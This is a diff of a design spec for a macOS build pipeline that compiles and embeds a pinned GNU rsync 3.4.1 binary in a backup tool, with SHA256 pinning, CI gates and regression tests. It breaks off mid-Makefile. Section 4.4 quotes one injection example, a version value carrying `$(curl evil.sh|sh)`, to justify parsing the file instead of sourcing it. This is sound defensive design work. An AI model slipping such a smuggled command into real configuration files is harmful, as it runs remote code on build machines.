@@ -3,7 +3,7 @@ title: FlashBackup Task 12a Design - Embedded GNU rsync 3.4.1 Build Pipeline
 created: 2026-06-06
 last_modified: 2026-06-06
 author: Mahesh Mirchandani
-status: draft (post multi-hat review)
+status: draft (post round-2 multi-hat review)
 supersedes: none
 ---
 
@@ -17,24 +17,26 @@ The v0.1.0-core tag (`b39a11c`, pushed 2026-06-05) is engine-correct but build-i
 
 Task 12a delivers the missing build pipeline: a script that produces a universal2 (arm64 + x86_64) GNU rsync 3.4.1 binary from upstream source, an embed mechanism that swaps it in for release builds, and the CI plumbing that gates against shipping the placeholder by mistake. Companion Task 12b adds the regression and release tests.
 
-This spec is the post-multi-hat-review revision. All 9 Critical and most Important findings from the 2026-06-06 CISO + Hacker + DevOps/SRE + QA + Senior Developer review have been folded in. Three concerns were spun off and tracked separately (Section 9.1).
+This spec is the round-2 multi-hat review revision. Round 1 found 9 Critical + 20 Important + 17 Minor findings; the v2 spec folded most of them in. Round 2 (CISO + Hacker + DevOps/SRE + QA + Senior Dev + Tech Lead/Architect) re-reviewed v2 and found 4 Critical + ~25 Important + ~12 Minor — round 2 was forensic ("your fix for X has a bug at line Y") rather than directional. v3 (this revision) addresses all 4 round-2 Criticals + Important clusters A-G; clusters H (reproducibility honesty) and I (GPG escalation trigger) are folded as wording tightens in §8.2 and §9.1 rather than new architecture.
 
 ## 2. Goals
 
 1. Produce a self-contained universal2 GNU rsync 3.4.1 binary that runs on any macOS 13+ machine with zero install-time dependencies.
 2. Make the dev / test build flow uninterrupted: `make build`, `go test`, and the existing e2e suite keep using the placeholder by default.
-3. Make the release build flow explicit, reproducible-where-cheap, and gated against malicious tag pushes.
+3. Make the release build flow explicit and gated against malicious tag pushes within the limits of single-maintainer trust assumptions (Section 8 risk table).
 4. Gate against accidental placeholder-release at three layers: per-commit CI smoke (matrix), release-workflow CI test, and an in-repo regression test for the placeholder behavior itself.
-5. Audit-clean: pinned upstream version, triple-sourced tarball SHA256 cross-check, recorded binary SHA256, build-provenance attestation, dual-published SHA256 sidecar.
+5. Provide auditable supply chain at the limits of provenance attestation — pinned upstream version, triple-witness SHA256 cross-check (acknowledged-Samba-ecosystem), recorded binary SHA256, Sigstore build-provenance attestation, dual-published SHA256 sidecar. **What attestation proves:** GitHub Actions built this artifact on this runner from this commit. **What attestation does not prove:** byte-identical to a local build (CI is authoritative; reproducibility deferred to Plan 2+).
 
 ## 3. Non-goals
 
-1. Code signing or notarization of the embedded rsync binary or the parent flashbackup binary. That work is Plan 2.
+1. Code signing or notarization of the embedded rsync binary or the parent flashbackup binary. Plan 2.
 2. Building rsync with optional features (openssl, zstd, lz4, xxhash). FlashBackup does not invoke any of these code paths.
 3. Cross-platform builds. macOS only. Linux / Windows are not flashbackup targets.
 4. Building any rsync version other than 3.4.1. Version bumps will be a future change.
-5. Byte-identical reproducible builds. Go binaries embed a build epoch + commit SHA via ldflag; making them deterministic is multi-week work. Section 8.3 documents the asymmetry.
-6. GPG verification of upstream rsync source. Section 4.4 documents the threat model that justifies SHA-only + triple-cross-check.
+5. Byte-identical reproducible builds. Go binaries embed a build epoch + commit SHA via ldflag; making them deterministic is multi-week work. Section 8.1 documents the asymmetry.
+6. GPG verification of upstream rsync source. Section 4.4 documents the triple-witness-within-Samba-ecosystem caveat that justifies SHA-only with explicit limits.
+7. CVE-response automation (Task 12c, queued §9.1).
+8. Release/rollback runbooks (Task 12d, queued §9.1).
 
 ## 4. Locked decisions
 
@@ -50,13 +52,13 @@ The embedded rsync is built with optional features disabled at configure time:
     --disable-xxhash
 ```
 
-This produces a binary that links only against `/usr/lib/libSystem.B.dylib` (always present on macOS). Final binary size: ~500 KB to 1 MB per architecture, ~1-2 MB universal2.
+Links only against `/usr/lib/libSystem.B.dylib`. Final binary size: ~500 KB to 1 MB per architecture, ~1-2 MB universal2.
 
-**Why Minimal:** FlashBackup uses rsync as a local-to-local file copier only. Daemon mode (openssl), network compression (zstd/lz4), and delta-rolling hash optimizations (xxhash) are never invoked. Bundling them statically would add ~5 MB to the binary and 6-12 CVEs/year to the dependency graph for code we never run. The features flashbackup actually uses (--xattrs, --acls, --inplace, --partial, --append) work fine in the Minimal build because they use libSystem syscalls on macOS, not external libraries. AC-12b-3 below verifies the --xattrs and --acls claim end-to-end.
+**Why Minimal:** FlashBackup uses rsync as a local-to-local file copier only. Bundling unused features adds CVE surface and binary size for code we never invoke. The features flashbackup actually uses (--xattrs, --acls, --inplace, --partial, --append) work fine in Minimal because they use libSystem syscalls on macOS, not external libraries. AC-12b-3 below verifies the --xattrs and --acls claim end-to-end.
 
-**Reversibility:** if Plan N adds remote backup or `--compress` over network, the build script extends to bundle the needed dep at that point. Asymmetric reversibility favors starting Minimal.
+**Reversibility:** if Plan N adds remote backup or `--compress` over network, the build script extends to bundle the needed dep then.
 
-### 4.2 Embed swap: Build-tag selection
+### 4.2 Embed swap: Build-tag selection (without touching `make build`)
 
 Two Go files behind `//go:build` tags select the embed payload. The existing `var embeddedRsync []byte` declaration in `internal/rsync/rsync.go` moves into each tagged file; mutually exclusive build constraints prevent duplicate declaration.
 
@@ -84,6 +86,8 @@ import _ "embed"
 var embeddedRsync []byte
 ```
 
+**Critical: the existing `make build` target stays unchanged.** `Makefile:63-68` currently builds with `-tags release` + `LDFLAGS_RELEASE` (flips `codesign.IsReleaseBuild=true`). That semantic is preserved. The placeholder-embedded `make build` artifact remains the dev/test default with the release-flagged linker output. A NEW target `make build-real-rsync` adds the `embed_real_rsync` tag on top of the existing `-tags release` to produce the real-rsync release binary. Naming chosen to NOT collide with `make release` (which a future Plan 2 may want for the tag-cut + sign + notarize sequence).
+
 **File state:**
 
 | Path | Status | Size | Source |
@@ -91,95 +95,115 @@ var embeddedRsync []byte
 | `internal/rsync/bin/rsync.placeholder` | Checked in | ~100 B | Existing shell script. No change. |
 | `internal/rsync/bin/rsync.universal2` | **gitignored** | ~1-2 MB | Produced by `scripts/build-rsync.sh`. |
 
-`.gitignore` gains TWO lines: `internal/rsync/bin/rsync.universal2` and `/build/` (the build script's work tree).
+`.gitignore` gains two lines: `internal/rsync/bin/rsync.universal2` and `/build/` (root-anchored; doesn't shadow non-root `build` dirs).
 
-**Artifact lifecycle:** `make build` (default placeholder) and `make release` (real rsync) leave the same `internal/rsync/bin/` directory state visible. The build-tag selects at compile time; the unselected file's presence on disk is harmless. `make clean-rsync` (Section 5.3) removes `internal/rsync/bin/rsync.universal2` + `./build/` for a clean state.
+**Artifact lifecycle:** `make build` (default placeholder + release-flagged) and `make build-real-rsync` (real rsync + release-flagged) leave the same `internal/rsync/bin/` directory state visible. The build-tag selects at compile time; the unselected file's presence on disk is harmless. `make clean-rsync` (Section 5.3) removes `internal/rsync/bin/rsync.universal2` + `./build/` and echoes what it removed.
 
 ### 4.3 Invocation contexts: All four
 
 | Context | Trigger | Action | Output |
 |---|---|---|---|
 | Local script | `make build-rsync` | Run `scripts/build-rsync.sh` | `internal/rsync/bin/rsync.universal2` |
-| Local release | `make release` | `make build-rsync` + `go build -tags embed_real_rsync` | Release flashbackup binary |
-| CI smoke | Every commit on `main`, matrix across macOS 13/14/15 | Single-arch quick build + assertions | Pass/fail signal only; no artifact |
-| CI release | Git tag push matching `v*.*.*` OR `workflow_dispatch` (with `environment: production` manual approval) | Full universal2 build + flashbackup release + Task 12b-B + attestation + draft upload | GitHub Release artifact (draft until MM publishes) |
+| Local real-rsync build | `make build-real-rsync` | `make build-rsync` + `go build -tags 'release embed_real_rsync'` | Real-rsync flashbackup binary |
+| CI smoke | Every commit on `main` + every PR; matrix across macOS 13/14/15 | Single-arch quick build + assertions | Pass/fail signal only |
+| CI release | Git tag push matching `v*.*.*` OR `workflow_dispatch` (with `environment: production` manual approval) | Full universal2 build + flashbackup real-rsync build + Task 12b-B + attestation + draft upload | GitHub Release draft (MM publishes after smoke check) |
 
-Per-commit smoke matrix on macos-13/14/15 keeps the supported-version surface honest (the Risks table previously claimed cross-macOS coverage; the smoke matrix delivers it).
-
-### 4.4 Upstream verification: Triple-source SHA256 cross-check
+### 4.4 Upstream verification: Triple-witness (within Samba ecosystem)
 
 Source pin lives in a dedicated file `scripts/rsync.version`:
 
 ```
-# Bump these two lines (and only these two) on rsync version updates.
+# Two literal assignments only. No expansion, no command substitution.
+# Parsed by build-rsync.sh via grep, NOT sourced as Bash.
 RSYNC_VERSION=3.4.1
-RSYNC_TARBALL_SHA256=<populated at implementation time; see below>
+RSYNC_TARBALL_SHA256=<populated at implementation time; see protocol below>
 ```
 
-`scripts/build-rsync.sh` reads this file. CI's `actions/cache@v4` keys on `hashFiles('scripts/rsync.version')` — refactoring the script body does NOT invalidate the tarball cache.
+`scripts/build-rsync.sh` parses these via a restricted grep regex (Section 5.1), not Bash `source`. This is a security-critical hardening from round 2: sourcing `rsync.version` as Bash would have made any PR landing `RSYNC_VERSION=3.4.1$(curl evil.sh|sh)` execute arbitrary code on every CI run and every dev machine. Parse-don't-source closes that vector.
 
-**Implementer protocol at constant population time** (locked by review, not optional):
+CI's `actions/cache@v4` keys on `hashFiles('scripts/rsync.version')` — refactoring the script body does NOT invalidate the tarball cache.
 
-The `RSYNC_TARBALL_SHA256` value is populated only after the implementer has verified it matches the same SHA256 in **three independent sources**:
+**Implementer protocol at constant population time** (locked by review):
 
-1. Homebrew's `Formula/r/rsync.rb` at the time of population (`brew tap homebrew/core; cat Formula/r/rsync.rb | grep sha256`).
+Populate `RSYNC_TARBALL_SHA256` only after the implementer has verified it matches the SHA256 in **three witnesses, all within the Samba ecosystem with explicit independence caveat**:
+
+1. Homebrew's `Formula/r/rsync.rb` (`brew tap homebrew/core; cat Formula/r/rsync.rb | grep sha256`).
 2. A Linux distro package recipe (Debian source-package `rsync_3.4.1.orig.tar.gz` SHA256 from packages.debian.org, OR Arch's `rsync` PKGBUILD).
 3. The rsync-announce mailing list announcement for 3.4.1 (https://lists.samba.org/archive/rsync-announce/).
 
-A comment immediately above the constant records the three sources consulted and the date. Discrepancy across any pair = HALT; surface to MM. Single-source population is the "pin was wrong from day 1" attack we explicitly defend against.
+**Independence caveat (per round-2 Hacker N4):** all three witnesses ultimately derive from samba.org. A single compromise at samba.org at announcement time poisons all three. Independence is therefore "best available without a genuinely-external mirror"; truly-independent verification would require a Samba-ecosystem-external mirror with its own GPG chain (e.g. Gentoo Manifest, Crater) — escalated to Plan 2 as part of GPG consideration. **What triple-witness defends against:** post-pin substitution at any single channel. **What it does not defend against:** pre-pin samba.org compromise.
 
-**Primary download channel: GitHub Release mirror of the tarball.** Once `RSYNC_TARBALL_SHA256` is populated and verified, the same tarball file is uploaded to a permanent GitHub Release of flashbackup itself (`upstream-mirror/rsync-3.4.1.tar.gz`). The build script downloads from THAT URL first; falls back to samba.org if the GitHub mirror is unreachable. This makes us independent of samba.org outages at release time and gives us a SHA-pinned canonical artifact that we control.
+**Attestation file** (round-2 CISO I1 fix): create `scripts/rsync.version.attestation` alongside `scripts/rsync.version`:
 
-```bash
-PRIMARY_URL="https://github.com/maheshmirchandani/Backup-Pro/releases/download/upstream-mirror/rsync-${RSYNC_VERSION}.tar.gz"
-FALLBACK_URL="https://download.samba.org/pub/rsync/src/rsync-${RSYNC_VERSION}.tar.gz"
+```
+# Attestation for rsync.version - witnesses observed at constant-population time.
+# All three lines must record the SAME SHA256 OR halt and surface discrepancy.
+Witness-Homebrew: <sha256> (Formula/r/rsync.rb @ <commit-sha>) observed YYYY-MM-DD
+Witness-Debian:   <sha256> (packages.debian.org rsync_3.4.1) observed YYYY-MM-DD
+Witness-Announce: <sha256> (rsync-announce 3.4.1 mail thread) observed YYYY-MM-DD
 ```
 
-Both URLs serve the same bytes (verified by SHA256 against the pinned constant). Either failing is recoverable.
+A CI lint job (`actions-lint` workflow, Section 5.4) fails if the attestation file is missing, mismatched, or older than 90 days from the `rsync.version` modification date.
 
-### 4.5 Companion Task 12b: Tightened regression tests
+**Primary download channel: GitHub mirror.** Once the constant is verified, the tarball is uploaded once as a permanent GitHub Release artifact of flashbackup itself, at a never-changing tag `upstream-mirror/rsync-3.4.1`:
+
+```bash
+PRIMARY_URL="https://github.com/maheshmirchandani/Backup-Pro/releases/download/upstream-mirror/rsync-3.4.1.tar.gz"
+FALLBACK_URL="https://download.samba.org/pub/rsync/src/rsync-3.4.1.tar.gz"
+```
+
+Both URLs serve identical bytes (SHA-pinned). Primary insulates us from samba.org outages at release time. Fallback handles the case where flashbackup's GitHub assets are unreachable.
+
+**Bootstrap procedure (round-2 DevOps I1 fix):** the very first release cannot use the GitHub mirror because the `upstream-mirror/rsync-3.4.1` tag does not yet exist. Documented procedure for first-release bootstrap:
+
+1. After populating `rsync.version` + `rsync.version.attestation`, manually download the tarball from samba.org.
+2. Run `./scripts/build-rsync.sh --verify-only` (a new mode that downloads + verifies SHA but skips build). Confirm SHA matches all three witnesses.
+3. Manually create GitHub Release `upstream-mirror/rsync-3.4.1` and upload the verified tarball.
+4. Subsequent releases use `PRIMARY_URL` automatically. This bootstrap is a one-time-per-version step (re-runs only on rsync version bumps).
+
+This procedure lives in `docs/runbooks/rsync-version-bump.md` (Task 12d, §9.1).
+
+### 4.5 Companion Task 12b: Tightened regression tests with externally-verified content equality
 
 **Task 12b-A: Placeholder regression guard**
 
-File: `test/e2e/placeholder_rejection_test.go` (new). Build tag: default (no `-tags embed_real_rsync`).
+File: `test/e2e/placeholder_rejection_test.go` (new). Build tag: default (no `embed_real_rsync`).
 
 Contract: when flashbackup is built with the default (placeholder) embed, a backup of any non-empty source produces:
 - Exit code 1
 - Exit status `partial`
 - `bytes_transferred = 0`
-- **The string `PLACEHOLDER rsync` appears in `rsync.log`** (added per QA C3: proves extract → exec actually happened; exit-code-alone is satisfied by extraction failures too)
+- **The string `PLACEHOLDER rsync` appears in `rsync.log`** (proves extract → exec actually happened — confirmed by reading `internal/runner/t2_transfer.go` PassThrough behavior during round 2; the placeholder's stdout pipes to rsync.log)
 
-Locks down the placeholder's behavior as an explicit invariant. Exercising the placeholder path end-to-end for the first time in the test suite.
-
-**Task 12b-B: Real-rsync release guard**
+**Task 12b-B: Real-rsync release guard with externally-verified content equality**
 
 File: `test/e2e/embedded_real_rsync_test.go` (new). Build tag: `embed_real_rsync`.
 
-Pre-check: `t.Skip("requires make build-rsync first")` if `internal/rsync/bin/rsync.universal2` does not exist. Locally, devs without the binary see a clean skip; the CI release workflow has the binary and the test runs.
+Pre-check: `t.Skip("requires make build-rsync first")` if `internal/rsync/bin/rsync.universal2` does not exist.
 
-Assertions, after init + 12b-B-fixture backup with no env override:
+Assertions, after init + extended-pathological-fixture backup with no env override:
 - Exit 0, exit status `ok`, `bytes_transferred > 0`
-- **Recursive content equality.** For every file in the fixture: compute SHA256 of source and SHA256 of dest via an independent code path (not the manifest's own hashing); assert equality. (QA C1: bytes>0 + manifest-internal verify is not the same as "rsync didn't silently corrupt.")
-- **Recursive tree equality.** `diff -rq <source> <dest-namespaced>` reports no differences.
-- The embedded rsync `--version` output begins with `rsync  version 3.4.1`.
-- `otool -L internal/rsync/bin/rsync.universal2` reports only `/usr/lib/libSystem.B.dylib` (regression guard for the Minimal build config).
+- **Externally-verified per-file content equality.** For every file in the fixture: compute source SHA256 via `internal/hash.StreamSHA256` (the manifest's path) AND dest SHA256 via `exec.Command("/usr/bin/shasum", "-a", "256", destPath)` (an INDEPENDENT external process, never sharing the manifest's hash code path). Assert source SHA256 == dest SHA256 from independent sources. This closes the "rsync silently corrupted" gap — manifest-internal verification of manifest-internal hashes proves nothing (round-2 QA C1').
+- **Recursive content-tree equality.** `exec.Command("/usr/bin/diff", "-rq", sourcePath, destPath)` reports no differences. (Note: `diff -rq` is content-only; xattr/ACL/flags survival are SEPARATE assertion layers, not implied by `diff -rq` passing.)
+- **xattr survival** (separate layer): for each fixture file with an xattr, assert `xattr -l <destPath>` output contains the same `user.flashbackup-test=<value>` line as the source.
+- **ACL survival** (separate layer): for each fixture file with an ACL entry, assert `ls -le <destPath>` output contains an ACL entry with the same `<recorded_user>: allow read` semantics. The recorded user is captured at fixture-generation time via a one-time `whoami` call and embedded in the test's expectation map — the test does NOT hardcode `runner` or `maheshm`; it compares against the recorded user from generation time. Same user is used for the source ACL write.
+- **Linkage regression**: `exec.Command("/usr/bin/otool", "-L", "-arch", "arm64", "internal/rsync/bin/rsync.universal2")` reports only `libSystem.B.dylib`; same for `-arch x86_64`. Two arch-specific calls avoid the universal2 multi-header parsing fragility.
+- **rsync version match**: `exec.Command(extractedRsyncPath, "--version")` first line matches regex `^rsync\s+version 3\.4\.1`.
 
-**Task 12b-B fixture (`test/fixtures/12b-b/`)** — locked composition:
-- ≥10 files
-- (a) at least one filename with spaces
-- (b) at least one Unicode NFD path (macOS HFS+ normalization edge)
-- (c) at least one file >4 KB and one >1 MB (xattrs are stored differently per size class)
-- (d) at least one symlink
-- (e) at least one file with `chflags uchg` set
-- (f) at least 3 directory depth levels
-- (g) at least one file with a custom xattr (`xattr -w user.flashbackup-test value f`)
-- (h) at least one file with an ACL entry (`chmod +a "user:$(whoami) allow read" f`)
+**Fixture: extend `test/fixtures/pathological/` instead of creating a fourth category** (round-2 Tech Lead Important 3).
 
-The fixture generator script writes the fixture from scratch in a temp dir at test setup; assertions then check (g) and (h) survive to the dest unchanged (`xattr -l <dest>/<file>` matches source; `ls -le <dest>/<file>` ACL matches source). This is the test that verifies the Section 4.1 claim that --xattrs and --acls work in the Minimal build (QA C2: claim previously unverified).
+The existing `pathological/` fixture already covers items (a)-(f) of round-1's locked composition: bell/esc-char filenames, NFC/NFD twin, control file, chflags-uchg file, deeply-nested long path, sparse file. We EXTEND `pathological/mkfixtures.sh` to add:
 
-### 4.6 CI YAML: Permissions, manual gate, attestation, action SHA pins
+- (g) **xattr-bearing file** `xattr-target.txt` — `mkfixtures.sh` writes content + immediately writes `xattr -w user.flashbackup-test "smoke-value-$(date +%s)" xattr-target.txt` at the final location (no copy/tar/mv after — preserves xattr per QA N1).
+- (h) **ACL-bearing file** `acl-target.txt` — `mkfixtures.sh` writes content + records `$(whoami)` to a sidecar file `acl-target.user` + applies `chmod +a "user:$(whoami) allow read" acl-target.txt`. The sidecar file is consumed by 12b-B for the recorded-user comparison; cleanup must remove the ACL before `t.TempDir()` removal else macOS may refuse the unlink.
 
-All third-party actions are pinned to commit SHA, not floating major tag. Permissions are least-privilege at job level. Release workflow uploads as `draft: true` and uses `environment: production` for manual approval. `actions/attest-build-provenance@v1` produces SLSA-style provenance for the artifact.
+`pathological/MANIFEST.txt` is amended to document (g) and (h). The `pathological/_MatchesManifest` tripwire test (introduced in Task 42a) re-baselines on the extended fixture.
+
+12b-B's "tiny fixture" reference uses `pathological/` post-extension. NO new `test/fixtures/12b-b/` directory is created.
+
+### 4.6 CI YAML: Permissions, manual gate, attestation, action SHA pins, anti-regression lints
+
+All third-party actions pinned to commit SHA, not floating major tag. Permissions least-privilege at job level. Release workflow uploads `draft: true` and gates on `environment: production`. `actions/attest-build-provenance@v1` produces SLSA-style provenance. **New CI lint workflow** (round-2 Hacker N6 + CISO I1) gates against floating action tags and stale rsync.version.attestation.
 
 Detailed YAML in Section 5.4.
 
@@ -190,21 +214,23 @@ Detailed YAML in Section 5.4.
 ```
 #!/bin/bash
 set -euo pipefail
-IFS=$'\n\t'   # safety against spaces in PROJECT_ROOT
+IFS=$'\n\t'
 
-# --- pinned constants come from sibling file ---
-# shellcheck source=rsync.version
-. "$(dirname "$0")/rsync.version"
-MIN_MACOS="13.0"
+# --- PATH hygiene at script entry (per round-2 Hacker I5) ---
+export PATH="/usr/bin:/bin:/usr/sbin:/sbin"
 
-# --- mode flag (default: full universal2; --smoke: arm64 only for CI per-commit) ---
+# --- mode flag ---
 SMOKE_MODE=0
-if [[ "${1:-}" == "--smoke" ]]; then
-    SMOKE_MODE=1
-fi
+VERIFY_ONLY=0
+case "${1:-}" in
+    --smoke)        SMOKE_MODE=1 ;;
+    --verify-only)  VERIFY_ONLY=1 ;;
+    "")             ;;
+    *)              echo "FATAL: unknown flag '$1'" >&2; exit 1 ;;
+esac
 
 # --- prereq check ---
-for tool in clang lipo shasum curl tar make; do
+for tool in clang lipo shasum curl tar make grep cut; do
     if ! command -v "${tool}" >/dev/null; then
         echo "FATAL: required tool '${tool}' not on PATH" >&2
         echo "  on macOS, install Xcode Command Line Tools: xcode-select --install" >&2
@@ -212,7 +238,7 @@ for tool in clang lipo shasum curl tar make; do
     fi
 done
 
-# --- paths (absolute; safe across cd) ---
+# --- paths ---
 PROJECT_ROOT="$(pwd)"
 WORK_DIR="${PROJECT_ROOT}/build"
 CACHE_DIR="${WORK_DIR}/cache"
@@ -221,14 +247,37 @@ ARM64_BUILD_DIR="${WORK_DIR}/arm64"
 AMD64_BUILD_DIR="${WORK_DIR}/amd64"
 OUTPUT_PATH="${PROJECT_ROOT}/internal/rsync/bin/rsync.universal2"
 
-# --- diagnostic trap: surface where to look on failure ---
-trap 'echo "FAILED. See ${WORK_DIR}/arm64/config.log (and amd64/) for build details." >&2' ERR
+# --- parse-don't-source rsync.version (per round-2 Hacker N1) ---
+VERSION_FILE="$(dirname "$0")/rsync.version"
+if [[ ! -f "${VERSION_FILE}" ]]; then
+    echo "FATAL: ${VERSION_FILE} not found" >&2
+    exit 1
+fi
+RSYNC_VERSION="$(grep -E '^RSYNC_VERSION=[A-Za-z0-9.-]+$' "${VERSION_FILE}" | cut -d= -f2)"
+RSYNC_TARBALL_SHA256="$(grep -E '^RSYNC_TARBALL_SHA256=[a-f0-9]{64}$' "${VERSION_FILE}" | cut -d= -f2)"
+if [[ -z "${RSYNC_VERSION}" || -z "${RSYNC_TARBALL_SHA256}" ]]; then
+    echo "FATAL: ${VERSION_FILE} malformed (RSYNC_VERSION or RSYNC_TARBALL_SHA256 missing or non-literal)" >&2
+    exit 1
+fi
+MIN_MACOS="13.0"
 
-# --- upstream URLs (GitHub mirror primary; samba.org fallback) ---
+# --- diagnostic trap: armed AFTER prereqs and version parse ---
+trap 'on_error' ERR
+on_error() {
+    if [[ -f "${ARM64_BUILD_DIR}/config.log" ]]; then
+        echo "FAILED. See ${ARM64_BUILD_DIR}/config.log (and amd64/) for build details." >&2
+    elif [[ -d "${SRC_DIR}" ]]; then
+        echo "FAILED during build setup. ${SRC_DIR} preserved for inspection." >&2
+    else
+        echo "FAILED before build started. See output above." >&2
+    fi
+}
+
+# --- upstream URLs ---
 PRIMARY_URL="https://github.com/maheshmirchandani/Backup-Pro/releases/download/upstream-mirror/rsync-${RSYNC_VERSION}.tar.gz"
 FALLBACK_URL="https://download.samba.org/pub/rsync/src/rsync-${RSYNC_VERSION}.tar.gz"
 
-# --- download + verify ---
+# --- download + verify (curl diagnostics NOT suppressed per round-2 Senior Dev I2) ---
 download_and_verify_tarball() {
     mkdir -p "${CACHE_DIR}"
     local tarball="${CACHE_DIR}/rsync-${RSYNC_VERSION}.tar.gz"
@@ -239,8 +288,9 @@ download_and_verify_tarball() {
         return
     fi
 
-    # Try primary (GitHub mirror), fall back to samba.org.
-    if ! curl -fSL --progress-bar -o "${tarball}.tmp" "${PRIMARY_URL}" 2>/dev/null; then
+    # Try primary (GitHub mirror); fall back to samba.org. Diagnostics flow through.
+    echo "downloading from primary mirror..." >&2
+    if ! curl -fSL --progress-bar -o "${tarball}.tmp" "${PRIMARY_URL}"; then
         echo "primary mirror unreachable; falling back to samba.org" >&2
         curl -fSL --progress-bar -o "${tarball}.tmp" "${FALLBACK_URL}"
     fi
@@ -251,7 +301,8 @@ download_and_verify_tarball() {
         echo "FATAL: tarball SHA256 mismatch" >&2
         echo "  expected: ${RSYNC_TARBALL_SHA256}" >&2
         echo "  got:      ${got}" >&2
-        rm -f "${tarball}.tmp"
+        echo "  (got HTML error page from a CDN? primary returned 200 with non-tarball body? inspect ${tarball}.tmp)" >&2
+        # Preserve tmp for inspection.
         exit 1
     fi
     mv "${tarball}.tmp" "${tarball}"
@@ -264,7 +315,6 @@ extract_sources() {
     tar -xzf "${CACHE_DIR}/rsync-${RSYNC_VERSION}.tar.gz" -C "${SRC_DIR}" --strip-components=1
 }
 
-# --- per-arch build with PATH hygiene ---
 build_arch() {
     local arch="$1"
     local build_dir="$2"
@@ -272,7 +322,6 @@ build_arch() {
     mkdir -p "${build_dir}"
 
     (cd "${build_dir}" && \
-     PATH="/usr/bin:/bin:/usr/sbin:/sbin" \
      CC="clang -arch ${arch} -mmacosx-version-min=${MIN_MACOS}" \
      "${SRC_DIR}/configure" \
         --disable-openssl \
@@ -282,7 +331,7 @@ build_arch() {
         --build="${arch}-apple-darwin" \
         --host="${arch}-apple-darwin")
 
-    (cd "${build_dir}" && PATH="/usr/bin:/bin:/usr/sbin:/sbin" make -j"$(sysctl -n hw.ncpu)")
+    (cd "${build_dir}" && make -j"$(sysctl -n hw.ncpu)")
 }
 
 lipo_universal() {
@@ -303,12 +352,18 @@ emit_audit() {
     else
         file "${OUTPUT_PATH}"
         echo "SHA256: $(shasum -a 256 "${OUTPUT_PATH}" | cut -d' ' -f1)"
-        otool -L "${OUTPUT_PATH}"
+        otool -L -arch arm64 "${OUTPUT_PATH}"
+        otool -L -arch x86_64 "${OUTPUT_PATH}"
         "${OUTPUT_PATH}" --version | head -1
     fi
 }
 
 main() {
+    if [[ ${VERIFY_ONLY} -eq 1 ]]; then
+        download_and_verify_tarball
+        echo "verify-only mode: tarball SHA matches pin. No build performed."
+        return
+    fi
     download_and_verify_tarball
     extract_sources
     build_arch "arm64" "${ARM64_BUILD_DIR}"
@@ -324,43 +379,47 @@ main "$@"
 
 **Idempotency contract:**
 - Every `make build-rsync` is a clean build of rsync itself; per-arch `build/` subdirs are `rm -rf`'d at the start of `build_arch`.
-- Only `build/cache/` (the tarball) survives across runs. `build/src/` and per-arch dirs do not.
-- The `./build/` tree is otherwise disposable. `make clean-rsync` removes it.
-- On failure, `./build/<arch>/config.log` and `./build/src/` are NOT cleaned (the next run's start does the cleanup); maintainer can inspect.
+- Only `build/cache/` survives across runs.
+- `./build/` is otherwise disposable. `make clean-rsync` removes it.
+- On failure, `./build/<arch>/config.log` and `./build/src/` are NOT cleaned (next run's start does cleanup); maintainer inspects.
 
-**Header block in script:** describes the script's intent + how to bump rsync version (edit `scripts/rsync.version` only) + the triple-source verification protocol. No separate `scripts/README.md` needed.
-
-`scripts/rsync.version` lives next to `build-rsync.sh`:
+**`scripts/rsync.version`** (security-locked format):
 
 ```
 # scripts/rsync.version - upstream rsync pin for FlashBackup.
 #
-# Bump ONLY these two lines on a version update. Implementer protocol:
-# cross-check RSYNC_TARBALL_SHA256 against THREE independent sources
-# before committing the change:
-#   1. brew tap homebrew/core; cat Formula/r/rsync.rb | grep sha256
-#   2. Debian source-package (packages.debian.org) OR Arch PKGBUILD
-#   3. rsync-announce mailing list announcement
-# Record the three sources + date in the comment above each constant change.
+# Two bare-literal assignments only. No quotes, no expansion, no
+# command substitution. Parsed by build-rsync.sh via grep, NOT
+# sourced as Bash (sourcing would enable arbitrary code execution
+# at build time).
+#
+# Bump procedure:
+#   1. Edit RSYNC_VERSION below.
+#   2. Compute new RSYNC_TARBALL_SHA256 (see runbooks/rsync-version-bump.md).
+#   3. Update scripts/rsync.version.attestation with three witness SHAs
+#      observed within 90 days of this edit.
+#   4. Run scripts/build-rsync.sh --verify-only locally to confirm.
+#   5. Upload tarball to upstream-mirror/rsync-X.Y.Z Release.
+#   6. Commit + push; CI lint enforces attestation freshness.
 RSYNC_VERSION=3.4.1
 RSYNC_TARBALL_SHA256=<populated at implementation time>
 ```
 
 ### 5.2 Go-side embed selection
 
-Today `internal/rsync/rsync.go` has:
-```go
-//go:embed bin/rsync.placeholder
-var embeddedRsync []byte
-```
+The `var embeddedRsync []byte` declaration is **removed from `internal/rsync/rsync.go`** and re-declared in each of the two new tag-gated files (Section 4.2). Build tags are mutually exclusive — exactly one declaration is in scope at compile time.
 
-After Task 12a, the `var embeddedRsync []byte` declaration is **removed from `rsync.go`** and re-declared in each of the two new tag-gated files (Section 4.2). Build tags are mutually exclusive, so exactly one declaration is in scope at compile time. Go does not reject this pattern.
+The rest of `rsync.go` is untouched: `EmbeddedSHA256()`, `EnsureExtracted()`, the SHA256 verify-from-disk fast path, tmp+rename atomicity.
 
-The rest of `rsync.go` is untouched: `EmbeddedSHA256()`, `EnsureExtracted()`, the SHA256 verify-from-disk fast path, tmp+rename atomicity. Implementer audit at task start: confirm `EnsureExtracted` (a) creates the tmp file with `O_EXCL` under a 0700 dir, (b) re-verifies SHA256 of the file AFTER rename, (c) applies `chflags uchg` AFTER rename, not before. These properties matter because the SHA-keyed extract path makes them load-bearing for integrity. Document the audit result inline in `rsync.go` doc comment if it required any changes.
+**Implementer audit at task start** (round-2 carryover from CISO Minor 5 / Hacker M8): confirm `EnsureExtracted` (a) creates the tmp file with `O_EXCL` under a 0700 dir, (b) re-verifies SHA256 of the file AFTER rename, (c) applies `chflags uchg` AFTER rename. These properties make the SHA-keyed extract path's integrity guarantee load-bearing. Document the audit result inline in `rsync.go` doc comment if changes were needed.
 
 ### 5.3 Makefile additions
 
+Existing `make build` semantics are PRESERVED. New targets added below it.
+
 ```makefile
+# Existing (unchanged): make build → -tags release + placeholder rsync.
+
 .PHONY: build-rsync
 build-rsync:
 	./scripts/build-rsync.sh
@@ -369,14 +428,19 @@ build-rsync:
 build-rsync-smoke:
 	./scripts/build-rsync.sh --smoke
 
-.PHONY: release
-release: build-rsync
-	go build -tags embed_real_rsync -ldflags "$(RELEASE_LDFLAGS)" -o flashbackup ./cmd/flashbackup
+.PHONY: build-rsync-verify
+build-rsync-verify:
+	./scripts/build-rsync.sh --verify-only
+
+.PHONY: build-real-rsync
+build-real-rsync: build-rsync
